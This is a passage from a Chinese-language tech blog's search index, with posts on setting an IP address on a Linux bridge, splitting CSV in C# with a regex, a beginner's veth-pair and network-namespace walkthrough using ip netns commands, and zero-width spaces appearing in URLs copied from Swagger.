因此，通常情況下，在 Linux 橋接上的網絡介面不需要配置 IP 地址。只需要在橋接器上配置 IP 地址，以使它能夠作為網絡的連接點。需要注意的是，具體的設置可能因系統和網絡配置而有所不同，因此在進行設定時，最好參考相關的文檔或參考指南。 可以在linux橋接器設定ip嗎？ 感謝你的指正，我之前的回答有一點錯誤。在 Linux 橋接器（如 br0）上是可以配置 IP 地址的。 在 Linux 系統中，你可以在橋接器上配置 IP 地址，以便它可以作為網絡的連接點。這對於某些場景非常有用，例如當你希望橋接器本身可以通過網絡來訪問，或者需要在橋接器上運行一些具有 IP 依賴性的服務。 要在 Linux 橋接器上配置 IP 地址，你可以通過以下步驟進行： 停止橋接器： sudo ip link set dev br0 down 配置 IP 地址： sudo ip addr add \u003cIP_address\u003e/\u003csubnet_mask\u003e dev br0 例如： sudo ip addr add 192.168.1.10/24 dev br0 這將在橋接器上配置 IP 地址為 192.168.1.10，子網掩碼為 24（即 255.255.255.0）。 啟動橋接器： sudo ip link set dev br0 up 現在，你已經在 Linux 橋接器上成功配置了 IP 地址。你可以使用 ip addr show 或 ifconfig 命令來檢查 IP 配置是否成功。 請注意，在配置 IP 地址時，請確保 IP 地址在你的網絡環境中是唯一的，並遵循正確的子網掩碼。同時，確保橋接器正確地連接到相應的網絡介面，例如 eth0。 希望這能幫助到你，如果你還有其他問題，請隨時提問。 ","date":"2023-09-14","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/:3:0","tags":["網路","bridge","nat"],"title":"網路 Bridge 和 NAT 差異","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/"},{"categories":["網路"],"content":"Bridge 相關文章 下次實作 Bridge 文章參考用。 (239) qemu/kvm bridge and NAT networking - YouTube Linux 虛擬網絡設備之 bridge - 閱坊 Linux Bridge 详解 - 知乎 Linux – Bridge – Benjr.tw Linux Bridge | 深入架构原理与落地实践 聊聊 Linux 上软件实现的“交换机” - Bridge！_51CTO博客_Linux 交换机 Linux Network Namespace and five of its use cases | by Ramesh Sahoo | Medium ","date":"2023-09-14","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/:4:0","tags":["網路","bridge","nat"],"title":"網路 Bridge 和 NAT 差異","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/"},{"categories":["網路"],"content":"彩蛋 [Linux] 內核虛擬Bridge, veth原理與實作 | Hands on Linux Kernel: bridge, veth | 黃大仙的雲端修行室 An introduction to Linux bridging commands and features | Red Hat Developer isno/theByteBook: 深入讲解网络、应用网络、ServiceMesh、容器等云原生相关技术。别光Star，好多错误的，给我提PR啊 ","date":"2023-09-14","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/:5:0","tags":["網路","bridge","nat"],"title":"網路 Bridge 和 NAT 差異","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF-Bridge-%E5%92%8C-NAT-%E5%B7%AE%E7%95%B0/"},{"categories":[".Net Core"],"content":"一般我常見程式解析 csv 程式都是用 split(',') 去解析不同欄位資料，但有經驗的工程師知道這個不是一個安全作法，可能會找額外 csvParse工具來解析。今天我看舊程式遇到這種方法，剛好有bug要解這個，有看到網路有一種比較安全轉換方法。 ","date":"2023-09-12","objectID":"/blog/posts/CSharp-CSV-%E5%88%86%E5%89%B2%E5%AD%97%E4%B8%B2-split-%E9%80%97%E8%99%9F-%E6%AF%94%E8%BC%83%E5%AE%89%E5%85%A8%E8%BD%89%E6%8F%9B%E6%96%B9%E6%B3%95/:0:0","tags":["csharp","csv","split"],"title":"C# CSV 分割字串 Split 逗號 比較安全轉換方法","uri":"/blog/posts/CSharp-CSV-%E5%88%86%E5%89%B2%E5%AD%97%E4%B8%B2-split-%E9%80%97%E8%99%9F-%E6%AF%94%E8%BC%83%E5%AE%89%E5%85%A8%E8%BD%89%E6%8F%9B%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"正規化解法 string csv = \"John,Doe,123 Main St,\\\"Anytown, USA\\\",55555\"; string pattern = \",(?=(?:[^\\\"]*\\\"[^\\\"]*\\\")*(?![^\\\"]*\\\"))\"; string[] result = Regex.Split(csv, pattern); foreach (string s in result) { Console.WriteLine(s); } 參考: c# regex split csv with quotes-掘金 備份圖 ","date":"2023-09-12","objectID":"/blog/posts/CSharp-CSV-%E5%88%86%E5%89%B2%E5%AD%97%E4%B8%B2-split-%E9%80%97%E8%99%9F-%E6%AF%94%E8%BC%83%E5%AE%89%E5%85%A8%E8%BD%89%E6%8F%9B%E6%96%B9%E6%B3%95/:1:0","tags":["csharp","csv","split"],"title":"C# CSV 分割字串 Split 逗號 比較安全轉換方法","uri":"/blog/posts/CSharp-CSV-%E5%88%86%E5%89%B2%E5%AD%97%E4%B8%B2-split-%E9%80%97%E8%99%9F-%E6%AF%94%E8%BC%83%E5%AE%89%E5%85%A8%E8%BD%89%E6%8F%9B%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"實作方法 string csvString = \"id,name,age\\n1,John,30\\n2,Jane,25\\n3,Bob,40\"; string[] lines = csvString.Split(new[] { '\\n', '\\r' }, StringSplitOptions.RemoveEmptyEntries); DataTable dt = new DataTable(); string[] headers = lines[0].Split(','); foreach (string header in headers) { dt.Columns.Add(header); } foreach (string line in lines.Skip(1)) { string[] values = line.Split(','); DataRow row = dt.NewRow(); for (int i = 0; i \u003c headers.Length; i++) { row[i] = values[i]; } dt.Rows.Add(row); } string json = JsonConvert.SerializeObject(dt, Newtonsoft.Json.Formatting.Indented); Console.WriteLine(json); 上面方法可以用 Regex 改寫方法。 另類寫法可以參考用。 ParseCsv(\"id,\\\"nameff\\\",age\\n1,John,30\\n2,Jane,25\\n3,Bob,40\").Dump(); string ParseCsv(string csv) { string json = string.Empty; string[] lines = csv.Replace(\"\\\\\", \"\").Split(new string[] { \"\\r\\n\",\"\\n\" }, System.StringSplitOptions.RemoveEmptyEntries); if (lines.Length \u003e 1) { string pattern = \",(?=(?:[^\\\"]*\\\"[^\\\"]*\\\")*(?![^\\\"]*\\\"))\"; // parse headers string[] headers = Regex.Split(lines[0].Trim(), pattern); StringBuilder sbjson = new StringBuilder(); sbjson.Clear(); sbjson.Append(\"[\"); // parse data for (int i = 1; i \u003c lines.Length; i++) { if (string.IsNullOrWhiteSpace(lines[i])) continue; if (string.IsNullOrEmpty(lines[i])) continue; sbjson.Append(\"{\"); string[] data = Regex.Split(lines[i].Replace(\"\\n\", \"\").Trim().Trim('?', '\"'), pattern); for (int h = 0; h \u003c headers.Length; h++) { sbjson.Append( $\"\\\"{headers[h]}\\\": \\\"{data[h].Trim('?', '\"')}\\\"\" + (h \u003c headers.Length - 1 ? \",\" : null) ); } sbjson.Append(\"}\" + (i \u003c lines.Length - 1 ? \",\" : null)); } sbjson.Append(\"]\"); json = sbjson.ToString(); } return json; } ","date":"2023-09-12","objectID":"/blog/posts/CSharp-CSV-%E5%88%86%E5%89%B2%E5%AD%97%E4%B8%B2-split-%E9%80%97%E8%99%9F-%E6%AF%94%E8%BC%83%E5%AE%89%E5%85%A8%E8%BD%89%E6%8F%9B%E6%96%B9%E6%B3%95/:1:1","tags":["csharp","csv","split"],"title":"C# CSV 分割字串 Split 逗號 比較安全轉換方法","uri":"/blog/posts/CSharp-CSV-%E5%88%86%E5%89%B2%E5%AD%97%E4%B8%B2-split-%E9%80%97%E8%99%9F-%E6%AF%94%E8%BC%83%E5%AE%89%E5%85%A8%E8%BD%89%E6%8F%9B%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"彩蛋 ","date":"2023-09-12","objectID":"/blog/posts/CSharp-CSV-%E5%88%86%E5%89%B2%E5%AD%97%E4%B8%B2-split-%E9%80%97%E8%99%9F-%E6%AF%94%E8%BC%83%E5%AE%89%E5%85%A8%E8%BD%89%E6%8F%9B%E6%96%B9%E6%B3%95/:2:0","tags":["csharp","csv","split"],"title":"C# CSV 分割字串 Split 逗號 比較安全轉換方法","uri":"/blog/posts/CSharp-CSV-%E5%88%86%E5%89%B2%E5%AD%97%E4%B8%B2-split-%E9%80%97%E8%99%9F-%E6%AF%94%E8%BC%83%E5%AE%89%E5%85%A8%E8%BD%89%E6%8F%9B%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"csv2json 使用 C# .NET 高效地將 CSV 轉換為 JSON | CSV2JSON 將 CSV 轉換為 JSON C# | products.aspose.com Convert JSON to CSV in C# convert csv string to json string c#-掘金 ","date":"2023-09-12","objectID":"/blog/posts/CSharp-CSV-%E5%88%86%E5%89%B2%E5%AD%97%E4%B8%B2-split-%E9%80%97%E8%99%9F-%E6%AF%94%E8%BC%83%E5%AE%89%E5%85%A8%E8%BD%89%E6%8F%9B%E6%96%B9%E6%B3%95/:2:1","tags":["csharp","csv","split"],"title":"C# CSV 分割字串 Split 逗號 比較安全轉換方法","uri":"/blog/posts/CSharp-CSV-%E5%88%86%E5%89%B2%E5%AD%97%E4%B8%B2-split-%E9%80%97%E8%99%9F-%E6%AF%94%E8%BC%83%E5%AE%89%E5%85%A8%E8%BD%89%E6%8F%9B%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"原本自己電腦 KVM 都特別要設定路由表特別把 IP 指定到 KVM 主機上面， KVM 主機也要設定 SNAT 設定上面，最近看到可以用橋接接受到外面設定 IP，這邊就簡單做個研究。看到 veth peer就好其實做看看。 Warning 本人非專業網路人員，針對網路蒐集一些資訊整理，實作把相關內容筆記下來，內容可能有誤。 ","date":"2023-09-11","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/:0:0","tags":["網路","veth","kvm","ip","bridge"],"title":"網路新手虛擬網路設備 veth pair 實作筆記","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"網路文章 [Linux] 內核虛擬Bridge, veth原理與實作 | Hands on Linux Kernel: bridge, veth | 黃大仙的雲端修行室 這邊我覺得裡面介紹名詞簡單到位。備份圖 其實以前有就有看類似這種文章，但是就是有看沒有懂，難得這次看就比較有感覺，打鐵趁熱，就來實作看看。 Linux veth pair 详解 - 知乎 Day 24: 什麼是 veth pair? - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 上面會挑幾個簡單來實例。 ","date":"2023-09-11","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/:1:0","tags":["網路","veth","kvm","ip","bridge"],"title":"網路新手虛擬網路設備 veth pair 實作筆記","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"前言 先了解名詞。 什麼是namespace 它是Linux內核的一項功能，能夠對內核資源進行分區，以使一組process看到指定一組資源，而另一組process看到另一組資源，所以namespace是linux用來進行資源的虛擬隔離方法 什麼是veth（virtual Ethernet） 是Linux 內核支援的一種虛擬網絡設備，是虛擬的網路裝置，veth 的兩端可以採用不同的網路namespace，所以可以用來做主機和容器之間的網路通信。 名詞解釋來源:[Linux] 內核虛擬Bridge, veth原理與實作 | Hands on Linux Kernel: bridge, veth | 黃大仙的雲端修行室 namespace和cgroup那時候在學 docker 知道主要都是靠 Linux 核心模擬出來，我們知道 docker 建立出來網路和系統是隔離的，本篇 ip netns 可以對 network namespace 做一些操作，本篇會新增 network namespace網路做個簡單互通。 veth pair 顧名思義，veth-pair 就是一對的虛擬裝置介面，和 tap/tun 裝置不同的是，它都是成對出現的。一端連著協議棧，一端彼此相連著。如下圖所示： 參考: Linux 虛擬網路裝置 veth-pair 詳解，看這一篇就夠了 - bakari - 部落格園 簡單來說，之前我一直在思考 GNS3設備跟設備之間都會拉一條線，不知道是怎麼模擬的。veth pair 簡單就是那一條線，在控制 veth 可以放置 namespace 裡面，當作把孔放置到設備上面。 Info 這邊可能不知道 Netowrk Protocaol Stack是什麼?我這邊簡單爬了一下就是 OSI 七層跟電腦供通，例如我們打 ping指令電腦是下面跑的，參考如下。 可參考: network stack是什么意思？_百度知道 Protocol stack - Wikipedia ","date":"2023-09-11","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/:2:0","tags":["網路","veth","kvm","ip","bridge"],"title":"網路新手虛擬網路設備 veth pair 實作筆記","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"簡單實作 因為電腦可能有裝 docker 或其他 VM。你的 interface 這邊可能會有很多種。你可以安裝multipass 工具。這是一個 multipass 快速建立 Ubuntu VM工具。這邊multipass有特別設定 kvm ，但理論上應該都差不多。 multipass start multipass shell ubuntu@primary:~$ ip a 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens3: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 52:54:00:70:a6:04 brd ff:ff:ff:ff:ff:ff altname enp0s3 inet 192.168.122.100/24 metric 100 brd 192.168.122.255 scope global dynamic ens3 valid_lft 3552sec preferred_lft 3552sec inet6 fe80::5054:ff:fe70:a604/64 scope link valid_lft forever preferred_lft forever 介面卡很乾淨。 # 先進去 root sudo -i # 建立兩個 network namespace ip netns add ns0 ip netns add ns1 # 建立一對veth ip link add veth0 type veth peer name veth1 # 將veth移動到netns中 ip link set veth0 netns ns0 ip link set veth1 netns ns1 # 設定 IP 和 啟動 ip netns exec ns0 ip addr add 172.18.0.2/24 dev veth0 ip netns exec ns0 ip link set veth0 up ip netns exec ns1 ip addr add 172.18.0.3/24 dev veth1 ip netns exec ns1 ip link set veth1 up 之後使用 ns1 ping 172.18.0.2 是 ping 的到的。 root@primary:~# ip netns exec ns1 ping 172.18.0.2 PING 172.18.0.2 (172.18.0.2) 56(84) bytes of data. 64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.523 ms 64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.085 ms 64 bytes from 172.18.0.2: icmp_seq=3 ttl=64 time=0.110 m 好了，其實 veth pair實作完成。就是這麼簡單，但是不熟網路或者第一次看到指令也不知道幹什麼事。這邊我整理一下。 ","date":"2023-09-11","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/:3:0","tags":["網路","veth","kvm","ip","bridge"],"title":"網路新手虛擬網路設備 veth pair 實作筆記","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"指令解說 ip-netns(8) - Linux manual page ↓查詢有哪些 network namespace ip netns [ list ] ↓新增一個 network namespace ip netns add NETNSNAME ↓刪除 network namespace ip [-all] netns del [ NETNSNAME ] 在 network namespace下指令。 ip [-all] netns exec [ NETNSNAME ] command… 上面用這個指令設定 namespace IP，可參考下方指令 ip netns exec ns0 ip addr add 172.18.0.2/24 dev veth0 Info 這邊很有趣，ip [-all] netns exec [ NETNSNAME ] command...，可以下ip netns exec ns0 bash進去 network namespace，注意這邊進去看起來是一個 vm，但也不要亂刪資料，雖然網路隔離，但資料跟實體是關聯的。我還以為那是一個虛擬空間。 ip-address(8) - Linux manual page ip address { add | change | replace } IFADDR dev IFNAME [ LIFETIME ] [ CONFFLAG-LIST ] 指令可以用縮寫ip addr，再回來看這個指令。 ip addr add 172.18.0.2/24 dev veth0 Info 常常看到ip addr 指令，但使用不常。有時不小心打錯 IP，這邊也有特別找一下調整 IP 方法。 ip addr replace/change 並不是針對網路卡進行更新的，而是將 網路卡+IP 同時作為判斷條件進行修改，即不能改 IP，但可以改其他參數。 如何要換 IP，則需要先刪除，再新增。 參考: * 【网络协议-7】IP 是怎么来的 | DemonLee’s Time 這個問AI也是得到類似答案，參考下文: 如果你在 Linux 上使用 ip addr add 命令錯誤地添加了一個 IP 地址，你可以使用以下步驟來進行調整： 確認你要調整的網絡介面的名稱，你可以使用 ip addr show 命令來查看已配置的 IP 地址和網絡介面。 使用 ip addr delete 命令刪除錯誤的 IP 地址。例如，假設你要刪除的錯誤 IP 地址是 192.168.0.100/24，網絡介面名稱是 eth0，則可以執行以下命令： sudo ip addr delete 192.168.0.100/24 dev eth0 這將從 eth0 網絡介面中刪除指定的 IP 地址。 確認 IP 地址已成功刪除。你可以再次運行 ip addr show 命令來檢查網絡介面上的 IP 地址。 請注意，這些命令需要使用 root 或具有相應權限的使用者執行，你可能需要在命令前加上 sudo 來獲取足夠的權限。 此外，如果你希望將正確的 IP 地址添加到網絡介面，你可以使用 ip addr add 命令進行配置。例如： sudo ip addr add 192.168.0.100/24 dev eth0 這會將 IP 地址 192.168.0.100/24 添加到 eth0 網絡介面上。請確保提供的 IP 地址和網絡介面名稱是正確的。 ip-link(8) - Linux manual page ip link add - add virtual link 看官方文章，這指令可以建立虛擬介面卡(veth) ip link add \u003cveth2 name\u003e type veth peer name \u003cveth2 name\u003e ip link set …. 看起來有很多東西可以設定，但其中把 device 放到 netns 裡面。 netns { PID | NETNSNAME | NETNSFILE } move the device to the network namespace associated with process PID or the name NETNSNAME or the file NETNSFILE. Some devices are not allowed to change network namespace: loopback, bridge, wireless. These are network namespace local devices. In such case ip tool will return \"Invalid argument\" error. It is possible to find out if device is local to a single network namespace by checking netns- local flag in the output of the ethtool: ethtool -k DEVICE To change network namespace for wireless devices the iw tool can be used. But it allows one to change network namespace only for physical devices and by process PID. ","date":"2023-09-11","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/:3:1","tags":["網路","veth","kvm","ip","bridge"],"title":"網路新手虛擬網路設備 veth pair 實作筆記","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"指令流程觀察介面 我們回顧這之前指令，新增指令順便觀察一下ip addr相關資訊。 # 建立兩個 network namespace ip netns add ns0 ip netns add ns1 # 建立一對veth ip link add veth0 type veth peer name veth1 # 將veth移動到netns中 ip link set veth0 netns ns0 ip link set veth1 netns ns1 # 設定 IP 和 啟動 ip netns exec ns0 ip addr add 172.18.0.2/24 dev veth0 ip netns exec ns0 ip link set veth0 up ip netns exec ns1 ip addr add 172.18.0.3/24 dev veth1 ip netns exec ns1 ip link set veth1 up 先看兩個 network namespace。 ip netns add ns0 ip netns add ns1 可以用 ip netns [list]查看那些 network namespace。 root@primary:~# ip netns ns1 (id: 1) ns0 (id: 0) 建立一對 veth-pair ip link add veth0 type veth peer name veth1 這邊很有趣可以看到新增兩個veth0和veth1。但這邊我們看到是veth1@veth0和veth0@veth1。 3: veth1@veth0: \u003cBROADCAST,MULTICAST,M-DOWN\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 92:83:9e:54:a5:90 brd ff:ff:ff:ff:ff:ff 4: veth0@veth1: \u003cBROADCAST,MULTICAST,M-DOWN\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether ca:f3:02:de:74:7e brd ff:ff:ff:ff:ff:ff 將 veth 移動到 netns 中 ip link set veth0 netns ns0 ip link set veth1 netns ns1 我們外面 host 下面下ip addr找不到 veth。但 network namespace有看到移到 ns0和ns1裡面去。 root@primary:~# ip netns exec ns0 ip a 1: lo: \u003cLOOPBACK\u003e mtu 65536 qdisc noop state DOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 4: veth0@if3: \u003cBROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether ca:f3:02:de:74:7e brd ff:ff:ff:ff:ff:ff link-netns ns1 root@primary:~# ip netns exec ns1 ip a 1: lo: \u003cLOOPBACK\u003e mtu 65536 qdisc noop state DOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 3: veth1@if4: \u003cBROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 92:83:9e:54:a5:90 brd ff:ff:ff:ff:ff:ff link-netns ns0 設定 IP 和 啟動 device。 ip netns exec ns0 ip addr add 172.18.0.2/24 dev veth0 ip netns exec ns0 ip link set veth0 up ip netns exec ns1 ip addr add 172.18.0.3/24 dev veth1 ip netns exec ns1 ip link set veth1 up Info 這邊能看到 interface 裡面veth0@if3的 @if3不需要打。這邊我有問 AI。 我那個 ip a指令看到 veth0@if4 後面@if4是什麼？為什麼我設定名字不需要打veth0@if4，要打veth0。 veth0@if4 中的 @if4 表示該接口是一個虛擬介面（Virtual Interface）的連接接口。 在這種情況下，veth0 是虛擬接口的名稱，而 @if4 表示該虛擬接口與物理介面 if4 相連接。虛擬接口通常是在 Linux 系統中使用的，用於連接不同的網絡命名空間（Network Namespace）或用於實現虛擬化網絡。 當你配置虛擬接口時，你只需要指定虛擬接口的名稱，不需要包含 @if4 的部分。例如，如果你想創建一個名為 veth0 的虛擬介面，可以使用以下命令： ip link add veth0 type veth peer name veth1 這將在系統中創建一對連接的虛擬介面 veth0 和 veth1。而 @if4 部分是系統自動生成的用於表示虛擬介面與其他介面（如 if4）的連接。 所以只需要使用 veth0 作為虛擬接口的名稱，而不需要包括 @if4 部分。其他類似的虛擬接口也遵循相同的模式，你只需要使用虛擬接口的名稱即可。 ","date":"2023-09-11","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/:3:2","tags":["網路","veth","kvm","ip","bridge"],"title":"網路新手虛擬網路設備 veth pair 實作筆記","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"圖示解釋 因為我一開始也不是很熟指令，所以在看這些文章不太明白他們是在做什麼。這邊我整理指令對應圖片，應該也能讓菜鳥看懂在做什麼。應該吧XD 在我們還沒下指令，只有 host 主機。 建立兩個 network namespace 2.1. ip netns add ns0 2.2. ip netns add ns1 建立一對veth ip link add veth0 type veth peer name veth1 將veth移動到netns中 4.1. ip link set veth0 netns ns0 4.2. ip link set veth1 netns ns1 後面設定 ip 就不需要特別畫了，透過指令跟圖片大概就知道這是幹嘛。這邊主機 Host 連不到兩個 network namespace ，這就是 linux 網路隔離，本機 host 看不到 namespace 網路介面卡。 ","date":"2023-09-11","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/:3:3","tags":["網路","veth","kvm","ip","bridge"],"title":"網路新手虛擬網路設備 veth pair 實作筆記","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"host 連上 namespace(加碼) 我突然想 讓host 應該能連 ns0 上面，只需要加上 veth-pair到 ns0去就可以了。這邊就動手實作。 ip link add veth2 type veth peer name veth3 ip link set veth2 netns ns0 ip netns exec ns0 ip addr add 172.19.0.2/24 dev veth2 ip netns exec ns0 ip link set veth2 up ip addr add 172.19.0.4/24 dev veth3 ip link set veth3 up 還滿順利的。 ","date":"2023-09-11","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/:4:0","tags":["網路","veth","kvm","ip","bridge"],"title":"網路新手虛擬網路設備 veth pair 實作筆記","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"總結 這個步驟做很多，我們學會透過 veth-pair 可以讓兩個namespace連線。但這樣我們新增一個 VM 不是很麻煩，都需要建立veth-pair，然後網域不能重複，這邊就需要bridge。當然ip addr學到一些資訊也不錯。 這樣我們新增一個 VM 不是很麻煩，都需要建立veth-pair。 這邊我覺得很難解釋，但主要就是講Linux veth pair 详解 - 知乎這段內容。 ","date":"2023-09-11","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/:5:0","tags":["網路","veth","kvm","ip","bridge"],"title":"網路新手虛擬網路設備 veth pair 實作筆記","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"彩蛋 rh_ip_command_cheatsheet_1214_jcs_print.pdf 順便還被我挖到以前舊指令相對應新指令打法。查看 IP 指令和路由筆記/被廢棄掉的指令 Linux Bridge 详解 - 知乎 Network Namespaces - HackMD ","date":"2023-09-11","objectID":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/:6:0","tags":["網路","veth","kvm","ip","bridge"],"title":"網路新手虛擬網路設備 veth pair 實作筆記","uri":"/blog/posts/%E7%B6%B2%E8%B7%AF%E6%96%B0%E6%89%8B-veth-pair-%E5%AF%A6%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":["HTML"],"content":"發現問題 最近看到使用 Refit API 網址 log出現 %E2%80%8B，讓我緊張不已。不過API看到是正常的。 也沒有跑出錯誤。本來想說是 refit 造成的原因，但是程式竟然沒有問題。這麼恐怖的事情當然要好好研究發生了什麼事。 這邊先據透原因，發現是文字有隱藏空白。參考如下圖 ","date":"2023-09-08","objectID":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/:1:0","tags":["html","swagger","空白字元","零寬空格"],"title":"網址出現 %E2%80%8B 問題與解決方式","uri":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/"},{"categories":["HTML"],"content":"心智圖 mindmap ((%E2%80%8B)) Zero_width_space 零寬空格 html wbr tags 複製到零寬字元原因 =\u003eswager wbr 影響裝置換行特性 ","date":"2023-09-08","objectID":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/:2:0","tags":["html","swagger","空白字元","零寬空格"],"title":"網址出現 %E2%80%8B 問題與解決方式","uri":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/"},{"categories":["HTML"],"content":"%E2%80%8B 是什麼? 網上查了下，%E2%80%8E 的學名叫 Zero-width-space(零寬空格) ，顧名思義，它是一個Unicode字元，肉眼不可見，卻是確實存在的一個字元。 引用: 前端 - 不要再复制了，url 空白编码引发的事故！！！ - 个人文章 - SegmentFault 思否 其他參考: 資深初心者: 網址後面出現奇怪的url encode 字串\"%E2%80%8B\" UTF-8 Tool 菜雞抓蟲: Url 變得怪怪的？你可能是零寬空格（ZWSP）的受害者！ | 伊果的沒人看筆記本 Info 這時候我發現swagger 有\u003cwbr\u003e標籤。 在 UTF-8 編碼的頁面中，\u003cwbr\u003e讀取U+200B ZERO-WIDTH SPACE（零寬空格）代碼點。特別是，它讀取 Unicode bidi BN 代碼點，存在，它對 bidi-ordering 影響：沒有\u003cdiv dir=rtl\u003e123,\u003cwbr\u003e456\u003c/div\u003e顯示123,456而不是456,123，當不拆成的兩行時候。 Danger 這個空白沒辦法用 Trim 過濾掉…。 魔鬼般的細節：使用 C# 的 String.Trim() 方法刪除空白字元 | The Will Will Web Tip 這邊要複製這個字很難，假如你要找這個空白，這邊可以直接複製。https://codepen.io/chriscoyier/pen/AwVNjg 